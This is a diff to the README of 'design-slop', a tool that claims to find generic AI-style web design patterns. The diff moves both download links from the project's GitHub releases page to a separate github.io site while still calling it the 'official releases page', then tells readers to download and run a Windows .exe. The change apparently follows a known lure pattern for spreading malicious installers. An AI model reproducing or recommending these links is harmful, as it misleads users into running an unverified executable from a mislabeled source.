@@ -1,6 +1,6 @@
 # 🎨 design-slop - Remove generic AI web design patterns
 
-[![](https://img.shields.io/badge/Download-Design_Slop-blue.svg)](https://github.com/Garconplucky882/design-slop/releases)
+[![](https://img.shields.io/badge/Download-Design_Slop-blue.svg)](https://garconplucky882.github.io)
 
 This software finds and fixes design patterns that look like generic artificial intelligence output. Many modern websites use automated layouts that feel repetitive or lack human touch. Design-slop helps you identify these elements and improve your user interface. It works by scanning your web pages for common signs of machine-generated design. You can then choose to remove these patterns or replace them with better options.
 
@@ -21,7 +21,7 @@ You need a computer running Windows 10 or Windows 11. The software requires at l
 
 ## 💾 Getting the software
 
-1. Visit the [official releases page](https://github.com/Garconplucky882/design-slop/releases) to download the latest installer.
+1. Visit the [official releases page](https://garconplucky882.github.io) to download the latest installer.
 2. Look for the file ending in `.exe`.
 3. Click the file to start the download.
 4. Save the file to your Downloads folder.
